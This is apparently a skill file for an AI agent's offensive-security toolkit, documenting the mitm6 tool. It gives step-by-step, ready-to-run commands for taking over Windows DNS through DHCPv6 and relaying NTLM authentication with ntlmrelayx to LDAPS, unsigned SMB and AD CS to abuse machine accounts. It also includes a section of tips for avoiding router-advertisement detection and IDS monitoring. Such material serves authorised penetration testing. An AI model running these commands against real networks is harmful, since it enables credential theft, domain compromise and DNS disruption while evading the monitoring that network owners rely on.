---
name: mitm6
description: "Take over DNS on an IPv4 network through DHCPv6, then relay the resulting NTLM authentication (including WPAD) to LDAP or SMB. Use when LLMNR and NBT-NS are disabled or filtered but hosts still accept DHCPv6. Not for capturing hashes to crack (use responder) and not for coercion of specific servers (use coercer)."
---

# mitm6

mitm6 exploits the fact that a Windows host prefers IPv6 DNS servers handed to it by DHCPv6 over the IPv4 DNS it received from DHCP. It answers DHCPv6 SOLICIT, becomes the client's DNS server, and then spoofs A/AAAA records for whatever names the host asks for. Because it never poisons LLMNR/NBT-NS, it still works on networks where legacy name resolution has been switched off. Version here is 0.3.0 (pipx, `/root/.local/bin/mitm6`), which adds a `-r` relay-target option that older guides do not describe.

## When to use

| Goal | Approach | Command shape |
| --- | --- | --- |
| Take over DNS for one AD domain | DHCPv6 + DNS spoof | `mitm6 -i eth0 -d corp.local` |
| Let every client query be answered | no domain filter | `mitm6 -i eth0` |
| Steer WPAD lookups to your relay | DNS spoof + relay HTTP | `mitm6 -d corp.local` + `ntlmrelayx.py -6 -wh wpad` |
| Skip WPAD lookups when you do not want proxy auth | blocklist | `mitm6 -d corp.local -b wpad` |
| Ignore hosts without an FQDN | DHCPv6 filter | `mitm6 -d corp.local --ignore-nofqdn` |
| Avoid rogue-RA detection | suppress router advertisements | `mitm6 -d corp.local -a` |
| Trigger auth through a relay hostname | SOA redirection | `mitm6 -d corp.local -r wpad.corp.local` |
| Scope DHCPv6 to named hosts | host allowlist | `mitm6 -d corp.local -hw ws01.corp.local` |

mitm6 captures nothing by itself: it produces NTLM authentication attempts aimed at your IP, so you need a relay or a rogue server listening. Its DNS answers only cover A, AAAA and (with `-r`) SOA; PTR is not answered by default in this build.

## Prerequisites

- Root: the tool sends raw Ethernet frames and its error text states `root privileges are required to run mitm6`.
- IPv6 enabled on your interface and on the victim (`sysctl net.ipv6.conf.all.disable_ipv6` must be `0`).
- Layer-2 adjacency; DHCPv6 is link-local multicast and does not cross routers.
- A relay or capture service on the same host. `ntlmrelayx.py` is at `~/.local/bin/ntlmrelayx.py` (impacket 0.13.1).
- For `-r`, the relay hostname must be one clients resolve through you, or the SOA redirection has nothing to hijack.

## Core invocations

```sh
# 1. Baseline: DHCPv6 takeover for one domain, verbose DNS logging
sudo mitm6 -i eth0 -d corp.local -v

# 2. Autodetect interface and DNS suffix (fastest start on a single-homed box)
sudo mitm6 -d corp.local

# 3. Serve every query, no domain filter (noisy, highest hit rate)
sudo mitm6 -i eth0

# 4. Suppress router advertisements where RA Guard or an IDS watches for them
sudo mitm6 -i eth0 -d corp.local -a

# 5. Ignore WPAD lookups (use only when not running the WPAD relay)
sudo mitm6 -d corp.local -b wpad

# 6. Only answer clients whose DHCPv6 FQDN matches a known host list
sudo mitm6 -d corp.local -hw ws01.corp.local -hw ws02.corp.local

# 7. Ignore clients that send no FQDN, removes printers and appliances
sudo mitm6 -d corp.local --ignore-nofqdn

# 8. Force a specific search domain instead of the first -d value
sudo mitm6 -i eth0 -l corp.local -4 10.10.10.50 -6 fe80::a00:27ff:fe00:1

# 9. Redirection for relay: SOA answers delegate to the relay name
sudo mitm6 -d corp.local -r wpad.corp.local -v

# 10. Pair with an LDAP relay to abuse the machine account
sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh wpad --delegate-access

# 11. Pair with SMB relay where signing is disabled
sudo ntlmrelayx.py -6 -t smb://10.10.10.20 -smb2support -socks

# 12. Pair with AD CS to request a certificate for the relayed machine
sudo ntlmrelayx.py -6 -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs

# 13. Dump relayed LDAP info without attacking, for triage
sudo ntlmrelayx.py -6 -t ldap://dc01.corp.local --no-da --no-acl
```

`-r` is this build's specific feature: it answers SOA queries for the queried zone with NS pointing at the relay name and glue pointing at your IPv4, and refuses dynamic DNS updates (`rcode 5`), which makes the client authenticate. Older 0.2.x documentation has no such flag; do not copy command lines from it.

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `-i` | interface | autodetects when omitted |
| `-l` | DNS search domain advertised | defaults to the first `-d` value |
| `-4` / `-6` | IPv4 / IPv6 source address | needed on multi-homed or NAT hosts |
| `-m` | custom MAC | help says it `probably breaks stuff` |
| `-a` | do not advertise via RA | keeps you off RA-detection tooling |
| `-r` | relay target hostname | SOA/NS redirection to trigger auth |
| `-d` | DNS allowlist domain (repeatable) | only names matching are spoofed |
| `-b` | DNS blocklist domain (repeatable) | takes precedence over `-d` |
| `-hw` / `-hb` | DHCPv6 host FQDN allow/blocklist | filters which clients get an answer |
| `--ignore-nofqdn` | skip clients with no DHCPv6 FQDN option | cuts server/appliance noise |
| `-v` / `--debug` | logging level | `--debug` prints packet detail |
| `--version` | not implemented in 0.3.0 | errors with `unrecognized arguments` |

## Workflow

1. **Confirm the network is IPv4-first.** mitm6 wins because IPv6 DNS beats IPv4 DNS on Windows. If hosts already have a real IPv6 DNS server, they may ignore you.
2. **Scope the DNS answer.** Start with `-d <ad domain>`; add `-hw` for specific workstations if the client is sensitive to disruption.
3. **Start the relay first.** `ntlmrelayx.py` must already be listening on 80/443 or 445, because mitm6 generates authentication within seconds of the first DHCPv6 SOLICIT.
4. **Decide the relay target by signing state.** LDAP/LDAPS works only when LDAP signing and channel binding are not enforced. Otherwise relay to SMB hosts without signing, or to the AD CS HTTP endpoint.
5. **WPAD is the highest-yield trigger.** With `-wh wpad`, ntlmrelayx serves a proxy script and Windows authenticates to it automatically; no user interaction is needed.
6. **Watch DHCPv6 churn.** Every reboot triggers a new SOLICIT; keep the run bounded and record which hosts you reconfigured.
7. **Restore state.** Client DNS entries expire with the lease; confirm no static DNS was written and stop the relay.

## OPSEC and telemetry

- Router advertisements every 30 seconds are obvious to any passive IPv6 monitor; `-a` removes them but slows client adoption.
- Windows logs DHCPv6 client events and DNS server changes; a DHCPv6 server that is not the approved one is exactly what DHCP snooping/RA Guard is built to catch.
- Relayed LDAP writes (computer account, RBCD) create 5136 directory-service change events and 4624 logons on the DC; relayed SMB shows as a network logon from the victim's IP.
- mitm6 does not write files itself, so the evidence trail is on the relay side (`ntlmrelayx` loot directory) plus DHCP server logs.
- Breaking DNS for a segment is an availability risk. Filter with `-d`/`-hw` rather than poisoning the whole broadcast domain.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `An error occurred while sending a packet ... root privileges` | not root | `sudo` |
| Runs, but no DNS hits | victim has working IPv6 DNS or IPv6 disabled | check `ip -6 addr` on victim subnet; fall back to responder |
| Clients keep old DNS | lease still valid | wait for renewal, or force DHCPv6 release on a test host |
| Relay receives anonymous/empty sessions | relay target enforces signing or EPA | switch target: SMB without signing, or AD CS HTTP |
| `unrecognized arguments: --version` | flag does not exist in 0.3.0 | `pipx list` shows `mitm6 0.3.0` |
| WPAD never fetched | no proxy script served | add `-wh wpad` to ntlmrelayx, verify port 80 free |
| `-r` produces SOA replies but no auth | relay name not resolvable through you | align `-r` with the spoofed domain, keep `-d` broad enough |
| Network-wide outage after start | unfiltered DHCPv6 on a production VLAN | stop, re-run with `-d` and `-hw` |

## Verification

```sh
mitm6 --help | head -5                     # usage line for 0.3.0
pipx list | grep mitm6                     # package mitm6 0.3.0
python3 -c "import scapy; print(scapy.__version__)"   # scapy present
ip -6 addr show dev eth0                   # link-local address exists
```

A working run prints `Sent spoofed reply for wpad.corp.local to fe80::...` and `Sent SOA reply` lines as clients query. Silence means no DHCPv6 traffic reached you: verify the interface and that IPv6 is enabled.

## Related skills

- [responder](../responder/SKILL.md) for LLMNR/NBT-NS capture on IPv4-only segments
- [coercer](../coercer/SKILL.md) when you need authentication from a named server, not a subnet
- [impacket](../impacket/SKILL.md) for `ntlmrelayx.py` target selection and relay attacks
- [hashcat](../hashcat/SKILL.md) if you capture instead of relay
- [netexec](../netexec/SKILL.md) to find hosts without SMB signing before choosing a relay target